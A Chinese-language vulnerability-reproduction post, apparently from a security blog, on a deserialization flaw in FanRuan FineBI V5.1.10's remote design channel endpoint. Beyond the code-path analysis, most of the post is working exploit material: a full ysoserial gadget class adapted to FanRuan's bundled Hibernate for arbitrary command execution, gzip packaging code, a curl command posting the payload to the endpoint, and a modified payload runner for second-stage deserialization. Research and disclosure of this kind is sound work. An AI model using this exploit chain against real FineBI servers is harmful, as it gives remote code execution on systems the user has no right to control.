#  帆软Finebi_V5.1.10_channel反序列化漏洞复现   
原创 kkk  漏洞推送   2025-01-07 08:22  
  
## 1.安装  
  
复现版本:FineBI V5.1.10  
  
安装后，后台地址 webroot/decision/login  
## 2.反编译  
  
找到所有以fine开头的包，复制到单独文件夹进行反编译  
## 3.漏洞复现  
  
在fine-decision-report-11.0/com/fr/decision/extension/report/api/remote/RemoteDesignResource.java  
文件中找到目录路由  
## 漏洞路由  
  
http://localhost:37799/webroot/decision/remote/design/channel  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD52Fyyl2QZvcIOrcaMvaqV3zjryRAwzZnialFQnJuL6CGgv0gFO734hcg/640?wx_fmt=png&from=appmsg "null")  
  
但是在帆软的官方安装包下，没有找到调试的方法，我们把源代码webroot  
放到tomcat的webapps  
目录下  
## 设置tomcat debug  
### mac  
  
chmod u+x *.sh  
  
新增文件setenv.sh  
  
JPDA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5VU0SZaXXVaZprpQ9nxo2N5NsvjWgnmLb989MyPHfpUEInUBkXHAfVA/640?wx_fmt=png&from=appmsg "null")  
  
然后再修改startup.sh,将最后一句改写成  
```
exec "$PRGDIR"/"$EXECUTABLE" jpda start "$@"
```  
### windows  
  
setenv.bat  
```
set JPDA_ADDRESS=5005
set JPDA_TRANSPORT=dt_socket
```  
  
startup.bat 加上jpda  
```
call "%EXECUTABLE%" jpda start %CMD_LINE_ARGS%
```  
  
然后通过jdk1.8,通过Windows启动tomcat，成功启动  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5RS9GlqQnV9S89kicbXa729Ak0dLQDcOqJdyMeHpWUHxmLiawE4OJib9pQ/640?wx_fmt=png&from=appmsg "null")  
  
但是经过测试，帆软清除了java包里面的行信息，导致在代码里面下断点，但是还是可以在方法中下断点的。  
## 代码分析  
  
输入的input流最后，经过层层转转以后到了InvocationSerializer  
 class的deserialize  
方法  
  
大概流程如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD58v366W7bICVBKa7IzibCC0tUKUSMFCDbMEkP1uruG5ycH7N5ROoGPmA/640?wx_fmt=png&from=appmsg "null")  
  
传递到WorkspaceServerInvoker  
的handleMessage  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5icfJgZekzp2qOKBhNfqb3GPCdH8gHerjUrSAPMCiaw6LQBA6wZh0NhvQ/640?wx_fmt=png&from=appmsg "null")  
  
然后继续调用this.deserializeInvocation  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5SIIAl0p0jicO3V6GLtnHuaPzIaCNg0LuMGNWqseeeLsQujSxSUkaqSw/640?wx_fmt=png&from=appmsg "null")  
  
SerializerHelper  
的deserialize  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5TqmPWicyWpNzGKlHQpEeAgJ4NzicDtBm8vEcYib1zFMibCu4BH8N8P7AfQ/640?wx_fmt=png&from=appmsg "null")  
  
然后进入InvocationSerializer  
的deserialize  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD51LnE3TlJ2o4KianbEN8IqQTYNmBBbuWVeqcSerBA9BRORjOBC3mfV8g/640?wx_fmt=png&from=appmsg "null")  
  
然后在这里就触发了readObject方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5S61iaSEQgYj3ShApRrLo4JaMkQMjOA8ToxfXZ0nNibY10yxYRxH2zKlw/640?wx_fmt=png&from=appmsg "null")  
  
为了方便测试漏洞，我们可以直接写一个class来进行触发  
```
package Main;

import com.fr.rpc.serialization.InvocationSerializer;

import java.io.File;
import java.io.FileInputStream;

public class Main {

    public static void main(String[] args) throws Exception {
        File file = new File("./test.bin");
        FileInputStream fileInputStream = new FileInputStream(file);
        InvocationSerializer invocationSerializer = InvocationSerializer.getDefault();
        invocationSerializer.deserialize(fileInputStream);
    }
}
```  
### Java反序列化  
  
首先我们学习一下Java反序列化的知识  
  
User.java  
```
package Main;

import java.io.Serializable;

public class User implements Serializable {
    public int age;
    public String name;

    public User(int age, String name) {
        this.age = age;
        this.name = name;
    }

    private void readObject(java.io.ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();
        System.out.println("User readObject");
    }
}
```  
  
Main.java  
```
package Main;

import com.fr.rpc.serialization.InvocationSerializer;

import java.io.*;
import java.util.HashMap;
import java.util.Objects;

public class Main {

    public static void main(String[] args) throws Exception {        
        User user = new User(18, "mbx");
        FileOutputStream fileOutputStream = new FileOutputStream("./test.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(user);
        objectOutputStream.close();
        //
        FileInputStream fileIn = new FileInputStream("./test.bin");
        ObjectInputStream in = new ObjectInputStream(fileIn);
        File file = (File) in.readObject();
    }
}
```  
  
执行以后，readobject方法成功执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD50tXTjJFBqypwPou69kQYyGSb1M9P5KAibvflF2WaW7ibaoQrsY06Snqg/640?wx_fmt=png&from=appmsg "null")  
  
比较容易出反序列化漏洞的就是重写了readObject  
方法，还有就是hashCode  
方法,反序列化Hashmap触发readObject  
 的时候就会触发hashCode  
方法。  
## 构造Exp  
  
ysoserial项目下新增一个文件src/main/java/ysoserial/payloads/FineHibernate1.java  
  
这个文件是个根据Hibernate1这个文件改来的，替换了部分帆软包名·  
```
package ysoserial.payloads;


import com.fr.third.org.hibernate.EntityMode;
import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;
import com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;
import com.fr.third.org.hibernate.type.AbstractType;
import com.fr.third.org.hibernate.type.ComponentType;
import com.fr.third.org.hibernate.type.Type;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


/**
 *
 * com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl.get()
 * com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * com.fr.third.org.hibernate.type.ComponentType.getPropertyValue(C)
 * com.fr.third.org.hibernate.type.ComponentType.getHashCode()
 * com.fr.third.org.hibernate.engine.spi.TypedValue$1.initialize()
 * com.fr.third.org.hibernate.engine.spi.TypedValue$1.initialize()
 * com.fr.third.org.hibernate.internal.util.ValueHolder.getValue()
 * com.fr.third.org.hibernate.engine.spi.TypedValue.hashCode()
 *
 *
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 *
 * @author mbechler
 */
@Authors({ Authors.MBECHLER })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class FineHibernate1 implements ObjectPayload<Object>, DynamicDependencies {
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public static String[] getDependencies () {
        if ( System.getProperty("hibernate5") != null ) {
            return new String[] {
                "com.fr.third.org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
                "javax.transaction:javax.transaction-api:1.2"
            };
        }

        return new String[] {
            "com.fr.third.org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
            "javax.transaction:javax.transaction-api:1.2", "dom4j:dom4j:1.6.1"
        };

    }


    public static Object makeGetter ( Class<?> tplClass, String method ) throws Exception {
        return makeHibernate5Getter(tplClass, method);
        // return makeHibernate5Getter(tplClass, method);
        // if ( System.getProperty("hibernate5") != null ) {
        //     return makeHibernate5Getter(tplClass, method);
        // }
        // return makeHibernate4Getter(tplClass, method);
    }


    public static Object makeHibernate4Getter ( Class<?> tplClass, String method ) throws ClassNotFoundException, NoSuchMethodException,
            SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("com.fr.third.org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        Reflections.setAccessible(bgCon);

        if ( !method.startsWith("get") ) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public static Object makeHibernate5Getter ( Class<?> tplClass, String method ) throws NoSuchMethodException, SecurityException,
            ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("com.fr.third.org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public Object getObject ( String command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);
        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
        return makeCaller(tpl, getters);
    }


    static Object makeCaller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        if ( System.getProperty("hibernate3") != null ) {
            return makeHibernate3Caller(tpl, getters);
        }
        return makeHibernate45Caller(tpl, getters);
    }


    static Object makeHibernate45Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    static Object makeHibernate3Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        // Load at runtime to avoid dependency conflicts
        Class entityEntityModeToTuplizerMappingClass = Class.forName("com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping");
        Class entityModeToTuplizerMappingClass = Class.forName("com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping");
        Class typedValueClass = Class.forName("com.fr.third.org.hibernate.engine.TypedValue");

        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        HashMap hm = new HashMap();
        hm.put(EntityMode.POJO, tup);
        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{ Map.class }, new Object[]{ hm });
        Reflections.setFieldValue(t, "tuplizerMapping", emtm);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(FineHibernate1.class, args);
    }
}
```  
  
转换成gzip的文件  
```
        FileInputStream fileIn = new FileInputStream("./test.bin");
        byte[] var3 = IOUtils.inputStream2Bytes(fileIn);
        OutputStream out = new GZIPOutputStream(new FileOutputStream("./g.bin"));
        out.write(var3);
        out.close();

        FileInputStream gfileIn = new FileInputStream("./g.bin");
        byte[] var4 = IOUtils.inputStream2Bytes(gfileIn);
        WorkContext.setMessageHandler(new WorkspaceServerInvoker());
        WorkContext.handleMessage(var4);
```  
## 通过curl发送payload  
  
curl --data-binary @g.bin http://192.168.3.168:8080/webroot/decision/remote/design/channel  
## 二次反序列化漏洞复现  
  
在readParams方法中，存在二次反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1cfhVzXXAr9FibQhP6DWjLD5sxibK3acamUjh8YJcNVTgGq08icyAiau9QVM0dJicXPk6gtrH34uS8gF4w/640?wx_fmt=png&from=appmsg "null")  
  
修改PayloadRunner  
的run  
方法  
```
public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);
                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);

                //FileOutputStream fileOutputStream = new FileOutputStream("test.bin");
                //InvocationSerializer invocationSerializer = new InvocationSerializer(null);
                //Method method = invocationSerializer.getClass().getDeclaredMethod("writeParams", Object[].class);
                //method.setAccessible(true);
                //Object[] myArgs = new Object[1];
                //myArgs[0] = objBefore;
                //method.invoke(myArgs);
                //fileOutputStream.write(Serializer.serialize(invocationSerializer));
                //fileOutputStream.close();
                //InvocationPack invocationPack = new InvocationPack()

                Class<?>[] innerClasses = InvocationSerializer.class.getDeclaredClasses();
                Class<?> innerClass = null;
                for (Class<?> cls : innerClasses) {
                    if (cls.getSimpleName().equals("InvocationPack")) {
                        innerClass = cls;
                    }
                }
                Constructor<?> constructor = innerClass.getDeclaredConstructor(String.class, String.class, Class[].class, byte[][].class);
                constructor.setAccessible(true);
                InvocationSerializer invocationSerializer = new InvocationSerializer(null);
                byte[] s = ser;
                byte[][] b = new byte[1][];
                b[0] = new byte[ser.length];
                System.arraycopy(ser, 0, b[0], 0, ser.length);
                Class[] c = new Class[]{String.class};
                Object innerObject = constructor.newInstance( "a", "a", c, b);
                //byte[] ser2 = Serializer.serialize(innerObject);
                //FileOutputStream fileOutputStream = new FileOutputStream("2test.bin");
                //fileOutputStream.write(ser2);
                Map map = new HashMap<String,String>();
                //fileOutputStream.write(Serializer.serialize(map));
                //fileOutputStream.close();

                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.txt"));
                oos.writeObject(innerObject);
                oos.writeObject(map);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
```  
  
  
